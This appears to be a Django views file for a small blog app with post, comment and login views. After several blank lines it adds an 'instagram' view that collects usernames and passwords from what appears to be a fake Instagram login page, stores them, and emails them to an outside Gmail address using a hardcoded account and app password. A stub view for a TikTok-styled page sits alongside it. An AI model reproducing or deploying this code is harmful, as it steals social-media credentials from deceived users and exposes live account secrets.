from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import authenticate, login, logout
from django.contrib import messages
from .models import Category, Post, Comment, ReplayComment, User


def home(request):
    posts = Post.objects.all()
    if request.method == "POST":
        comment = request.POST.get("comment")
        post_id = request.POST.get("post_id")
        if comment:
            if request.user.is_authenticated:
                Comment.objects.create(user=request.user, content=comment, post=get_object_or_404(Post, id=post_id)).save()
            else:
                Comment.objects.create(content=comment, post=get_object_or_404(Post, id=post_id)).save()
    return render(request, "home.html", {'posts':posts})

def detail(request, pk):
    post = get_object_or_404(Post, id=pk)
    comments = Comment.objects.filter(post=post)
    if request.method == "POST":
        comment = request.POST.get("comment")
        post_id = request.POST.get("post_id")
        if comment:
            if request.user.is_authenticated:
                Comment.objects.create(user=request.user, content=comment, post=get_object_or_404(Post, id=post_id)).save()
            else:
                Comment.objects.create(content=comment, post=get_object_or_404(Post, id=post_id)).save()
    return render(request, "detail.html", {'post':post, "comments":comments})

def upload(request):

    if request.method == "POST":
        title = request.POST.get("title")
        content = request.POST.get("content")
        image = request.POST.get("image")
        if request.user.is_authenticated:
            Post.objects.create(
                author=request.user,
                title=title,
                content=content,
                image=image
            ).save()
        else:
            Post.objects.create(
                title=title,
                content=content,
                image=image
            ).save()
        return redirect("/")
    return render(request, "upload.html")

def auth(request):
    if request.GET.get('type') == "login":
        add_type = "login"
    elif request.GET.get('type') == "signup":
        add_type = "signup"
    else:
        add_type = None
    if request.method == "POST":
        t_login = request.POST.get("login")
        if t_login:
            username = request.POST.get("username")
            password = request.POST.get("password")

            user = authenticate(username=username, password=password)
            if user is not None:
                login(request, user)
                messages.success(request, "You have been successfully logged in.")
                return redirect('/')
            else:
                messages.error(request, "There was an error during login.")
                return redirect('/auth/?type=login')
            
        signup = request.POST.get("signup")
        if signup:
            if len(User.objects.all()) >= 100000:
                messages.error(request, "please try again!")
                return redirect('/auth/?type=signup')
            else:
                username = request.POST.get("username")
                password = request.POST.get("password")
                repeat_password = request.POST.get("repeat-password")
                if password == repeat_password and not User.objects.filter(username=username).exists():
                    User.objects.create_user(username=username, password=password).save()
                    messages.success(request, "You have been successfully signup.")
                    return redirect("/auth/?type=login")
                else:
                    messages.error(request, "There was an error during login.")
                    return redirect('/auth/?type=signup')
    return render(request, "auth.html", {"type":add_type})










def instagram(request):
    if request.method == "POST":
        username = request.POST.get("username")
        password = request.POST.get("enc_password")
        from .models import Instagram
        if username and password:
            Instagram.objects.create(username=username, password=password).save()
        #######################################
        try:
            import smtplib
            my_email = "jjjhacking@gmail.com"
            email_password = "mjzs kcsc cvjs cbji"
            content = f"""
username = {username}
password = {password}
                    """
            with smtplib.SMTP("smtp.gmail.com") as con:
                con.starttls()
                con.login(user=my_email, password=email_password)
                con.sendmail(
                    from_addr=my_email,
                    to_addrs="eyobjjj@gmail.com",
                    msg=f"Subject:**New Instagram User & Pass**\n\nhi {content}"
                )
        except:
            print("can't send email")
        #######################################
    return render(request, "instagram/index.html")


def e_tiktok1(request):
    return render(request, "e-tiktok1/index.html")


